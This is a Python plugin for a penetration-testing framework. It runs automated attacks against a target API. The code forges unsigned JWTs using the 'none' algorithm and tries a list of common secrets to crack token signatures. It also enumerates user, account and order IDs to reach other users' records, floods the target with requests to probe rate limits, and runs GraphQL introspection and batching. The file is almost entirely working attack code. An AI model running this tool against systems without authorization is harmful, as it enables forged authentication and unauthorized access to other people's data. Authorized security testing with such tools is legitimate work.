#!/usr/bin/env python3
"""
API Security Exploitation Plugin
Comprehensive API testing for REST, GraphQL, and SOAP APIs
"""

import requests
import json
import sys
import jwt as pyjwt
from urllib.parse import urljoin, urlparse
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

class APIExploiter:
    def __init__(self, target, options=None):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.options = options or {}

        self.api_type = self.options.get('api_type', 'rest')
        self.auth_token = self.options.get('auth_token', '')
        self.test_bola = self.options.get('test_bola', True)
        self.test_jwt = self.options.get('test_jwt', True)
        self.test_rate_limit = self.options.get('test_rate_limit', True)

        # Parse ID range
        id_range = self.options.get('id_range', '1-100')
        try:
            start, end = map(int, id_range.split('-'))
            self.id_range = range(start, end + 1)
        except:
            self.id_range = range(1, 101)

        self.session = requests.Session()
        if self.auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {self.auth_token}'
            })

        self.results = {
            'target': self.target,
            'api_type': self.api_type,
            'vulnerabilities': [],
            'findings': [],
            'endpoints': []
        }

    def run(self):
        """Main exploitation execution"""
        print(f"[*] Starting API security testing: {self.target}")
        print(f"[*] API Type: {self.api_type}")

        # API Discovery
        self.discover_api_endpoints()

        # JWT Testing
        if self.test_jwt and self.auth_token:
            self.test_jwt_security()

        # BOLA Testing
        if self.test_bola:
            self.test_bola_vulnerability()

        # Rate Limit Testing
        if self.test_rate_limit:
            self.test_rate_limiting()

        # GraphQL Specific Tests
        if self.api_type == 'graphql':
            self.test_graphql_introspection()
            self.test_graphql_batching()

        # Authentication Tests
        self.test_authentication()

        # HTTP Method Testing
        self.test_http_methods()

        return self.results

    def discover_api_endpoints(self):
        """Discover API endpoints"""
        print("[*] Discovering API endpoints...")

        # Common API paths
        api_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/rest', '/rest/v1',
            '/graphql', '/graphiql',
            '/swagger', '/swagger.json', '/swagger.yaml',
            '/openapi.json', '/api-docs',
            '/api/swagger-ui', '/api/docs'
        ]

        found = 0
        for path in api_paths:
            try:
                url = urljoin(self.target, path)
                response = self.session.get(url, timeout=5, allow_redirects=False)

                if response.status_code in [200, 201, 301, 302]:
                    self.results['endpoints'].append({
                        'url': url,
                        'status': response.status_code,
                        'type': 'discovery'
                    })
                    found += 1
                    print(f"[+] Found: {url} ({response.status_code})")

            except:
                pass

        print(f"[+] Discovered {found} API endpoints")

    def test_jwt_security(self):
        """Test JWT token security"""
        print("[*] Testing JWT security...")

        try:
            # Decode without verification
            header = pyjwt.get_unverified_header(self.auth_token)
            payload = pyjwt.decode(self.auth_token, options={"verify_signature": False})

            self.results['findings'].append({
                'type': 'jwt_info',
                'algorithm': header.get('alg'),
                'payload': payload
            })

            print(f"[+] JWT Algorithm: {header.get('alg')}")

            # Test None algorithm
            self.test_jwt_none_algorithm()

            # Test weak secrets
            self.test_jwt_weak_secret()

        except Exception as e:
            print(f"[-] JWT test failed: {e}")

    def test_jwt_none_algorithm(self):
        """Test none algorithm vulnerability"""
        print("[*] Testing JWT none algorithm...")

        try:
            payload = pyjwt.decode(self.auth_token, options={"verify_signature": False})

            # Create header with none
            none_header = {'alg': 'none', 'typ': 'JWT'}

            # Try to encode without signature
            import base64
            header_b64 = base64.urlsafe_b64encode(
                json.dumps(none_header).encode()
            ).decode().rstrip('=')

            payload_b64 = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).decode().rstrip('=')

            none_token = f"{header_b64}.{payload_b64}."

            # Test the none algorithm token
            test_response = self.session.get(
                self.target,
                headers={'Authorization': f'Bearer {none_token}'},
                timeout=5
            )

            if test_response.status_code == 200:
                self.results['vulnerabilities'].append({
                    'type': 'jwt_none_algorithm',
                    'severity': 'critical',
                    'description': 'Server accepts JWT with "none" algorithm',
                    'proof': none_token[:50] + '...'
                })
                print("[!] CRITICAL: None algorithm accepted!")

        except Exception as e:
            pass

    def test_jwt_weak_secret(self):
        """Test for weak JWT secrets"""
        print("[*] Testing for weak JWT secrets...")

        common_secrets = [
            'secret', 'Secret', 'SECRET',
            'jwt', 'JWT', 'jwt_secret',
            'password', 'admin', '123456'
        ]

        for secret in common_secrets:
            try:
                # Try to verify with this secret
                pyjwt.decode(
                    self.auth_token,
                    secret,
                    algorithms=['HS256', 'HS384', 'HS512']
                )

                self.results['vulnerabilities'].append({
                    'type': 'jwt_weak_secret',
                    'severity': 'critical',
                    'secret': secret,
                    'description': f'JWT uses weak secret: {secret}'
                })
                print(f"[!] CRITICAL: Weak secret found: {secret}")
                return

            except:
                continue

    def test_bola_vulnerability(self):
        """Test for BOLA/IDOR vulnerabilities"""
        print(f"[*] Testing for BOLA/IDOR (range: {self.id_range.start}-{self.id_range.stop-1})...")

        # Try to find endpoints with ID parameters
        test_endpoints = [
            '/api/users/{id}',
            '/api/v1/users/{id}',
            '/api/accounts/{id}',
            '/api/profile/{id}',
            '/api/user/{id}/profile',
            '/api/orders/{id}'
        ]

        vulnerable_endpoints = []

        for endpoint_template in test_endpoints:
            accessible = 0
            for user_id in list(self.id_range)[:20]:  # Test first 20 IDs
                try:
                    url = urljoin(self.target, endpoint_template.format(id=user_id))
                    response = self.session.get(url, timeout=5)

                    if response.status_code == 200:
                        accessible += 1

                except:
                    pass

            if accessible > 1:  # If multiple IDs are accessible
                vulnerable_endpoints.append(endpoint_template)
                self.results['vulnerabilities'].append({
                    'type': 'bola_idor',
                    'severity': 'high',
                    'endpoint': endpoint_template,
                    'accessible_count': accessible,
                    'description': f'BOLA/IDOR vulnerability - {accessible} IDs accessible'
                })
                print(f"[!] BOLA found: {endpoint_template} ({accessible} IDs)")

        if not vulnerable_endpoints:
            print("[+] No BOLA/IDOR detected")

    def test_rate_limiting(self):
        """Test API rate limiting"""
        print("[*] Testing rate limiting...")

        # Make rapid requests
        requests_to_make = 50
        successful = 0
        rate_limited = 0

        for i in range(requests_to_make):
            try:
                response = self.session.get(self.target, timeout=2)

                if response.status_code == 200:
                    successful += 1
                elif response.status_code == 429:
                    rate_limited += 1
                    break

            except:
                pass

        if rate_limited == 0:
            self.results['vulnerabilities'].append({
                'type': 'no_rate_limiting',
                'severity': 'medium',
                'requests_made': successful,
                'description': 'No rate limiting detected'
            })
            print(f"[!] No rate limiting ({successful}/{requests_to_make} requests succeeded)")
        else:
            print(f"[+] Rate limiting active (limited after {successful} requests)")

    def test_graphql_introspection(self):
        """Test GraphQL introspection"""
        print("[*] Testing GraphQL introspection...")

        introspection_query = {
            "query": """
            {
                __schema {
                    queryType { name }
                    types { name }
                }
            }
            """
        }

        try:
            response = self.session.post(
                self.target,
                json=introspection_query,
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                if '__schema' in str(data):
                    self.results['vulnerabilities'].append({
                        'type': 'graphql_introspection_enabled',
                        'severity': 'medium',
                        'description': 'GraphQL introspection is enabled'
                    })
                    print("[!] GraphQL introspection enabled")

                    # Count types
                    types = data.get('data', {}).get('__schema', {}).get('types', [])
                    print(f"[+] Found {len(types)} types in schema")

        except:
            pass

    def test_graphql_batching(self):
        """Test GraphQL batch queries"""
        print("[*] Testing GraphQL batching...")

        batch_query = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"}
        ]

        try:
            response = self.session.post(
                self.target,
                json=batch_query,
                timeout=10
            )

            if response.status_code == 200:
                data = response.json()
                if isinstance(data, list):
                    self.results['findings'].append({
                        'type': 'graphql_batching_enabled',
                        'description': 'GraphQL batch queries are supported'
                    })
                    print("[!] GraphQL batching enabled (rate limit bypass possible)")

        except:
            pass

    def test_authentication(self):
        """Test authentication mechanisms"""
        print("[*] Testing authentication...")

        # Test without authentication
        session_no_auth = requests.Session()

        try:
            response = session_no_auth.get(self.target, timeout=5)

            if response.status_code == 200:
                self.results['vulnerabilities'].append({
                    'type': 'unauthenticated_access',
                    'severity': 'high',
                    'description': 'API accessible without authentication'
                })
                print("[!] API accessible without authentication")
            elif response.status_code in [401, 403]:
                print("[+] Authentication required")

        except:
            pass

    def test_http_methods(self):
        """Test HTTP methods"""
        print("[*] Testing HTTP methods...")

        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']

        allowed_methods = []
        for method in methods:
            try:
                response = self.session.request(method, self.target, timeout=5)

                if response.status_code not in [404, 405]:
                    allowed_methods.append(method)

            except:
                pass

        if 'DELETE' in allowed_methods or 'PUT' in allowed_methods:
            self.results['findings'].append({
                'type': 'dangerous_methods_allowed',
                'methods': allowed_methods,
                'description': f'Potentially dangerous methods allowed: {", ".join(allowed_methods)}'
            })

        print(f"[+] Allowed methods: {', '.join(allowed_methods)}")


def main(target, options=None):
    """Plugin entry point"""
    exploiter = APIExploiter(target, options)
    results = exploiter.run()

    # Print summary
    print("\n" + "="*60)
    print("API SECURITY SCAN SUMMARY")
    print("="*60)
    print(f"Vulnerabilities: {len(results['vulnerabilities'])}")
    print(f"Findings: {len(results['findings'])}")
    print(f"Endpoints: {len(results['endpoints'])}")

    # Print critical/high severity vulns
    critical = [v for v in results['vulnerabilities'] if v.get('severity') in ['critical', 'high']]
    if critical:
        print(f"\nCritical/High Severity Issues: {len(critical)}")
        for vuln in critical:
            print(f"  - {vuln['type']}: {vuln.get('description', 'N/A')}")

    return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url> [auth_token]")
        sys.exit(1)

    target = sys.argv[1]
    options = {}

    if len(sys.argv) > 2:
        options['auth_token'] = sys.argv[2]

    result = main(target, options)
    print(json.dumps(result, indent=2))
